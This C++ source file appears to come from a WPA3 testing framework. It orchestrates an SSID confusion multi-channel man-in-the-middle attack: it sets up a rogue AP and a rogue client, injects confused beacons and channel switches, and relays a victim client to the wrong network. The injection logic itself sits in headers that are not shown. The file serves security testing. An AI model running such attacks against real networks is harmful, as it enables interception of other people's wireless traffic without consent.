#include "attacks/mc_mitm/ssid_confusion/ssid_confusion_attack.h"

#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include "attacks/components/setup_connections.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "config/RunStatus.h"
#include "observer/dmesg_wrapper.h"
#include "system/hw_capabilities.h"
#include "system/utils.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::ssid_confusion {


// Copy supplicant config + EAP user file (if present); start WrongNet AP + client.
void setup_attack(RunStatus &rs) {
    const auto cfg_dir = rs.config_path().parent_path() / "config";
    for(const auto &f : {"SafeNet_WrongNet.conf", "hostapd.eap_user"}) {
        const auto src = cfg_dir / f;
        if(exists(src)) copy_f(src, rs.run_folder() / f);
    }

    const auto rogue_client = rs.get_actor("rogue_client");
    rogue_client->set_iface_up();
    components::client_ap_setup_t(rs);
}

// Topology: WrongNet AP (ch 11) <-> rogue_client (ch 11) <-> rogue_ap (ch 1, fake SafeNet) <-> client
void run_attack(RunStatus &rs) {
    const auto rogue_ap     = rs.get_actor("rogue_ap");     // injects confused beacons, relays client
    const auto rogue_client = rs.get_actor("rogue_client"); // CSA injection, relays to wrong AP
    const auto ap           = rs.get_actor("ap");           // WrongNet AP
    const auto client       = rs.get_actor("client");

    const auto &att_cfg        = rs.config().at("attack_config");
    const string confused_ssid = att_cfg.at("confused_ssid");
    const int    beacon_ms     = att_cfg.at("beacon_interval_ms");
    const int    beacon_warn_s = att_cfg.at("beacon_warning_sec");

	SsidConfusion attack(rogue_client, rogue_ap, client, ap, rs.run_folder(), confused_ssid, beacon_ms, beacon_warn_s );

	rs.process_manager.write_log_all(ATTACK_START_tag);
	attack.run(rs, rs.config().at("attack_config").at("attack_time_sec").get<int>());
	rs.process_manager.write_log_all(ATTACK_STOP_tag);
}

void stats_attack(const RunStatus &rs) {
	//TODO
}

}
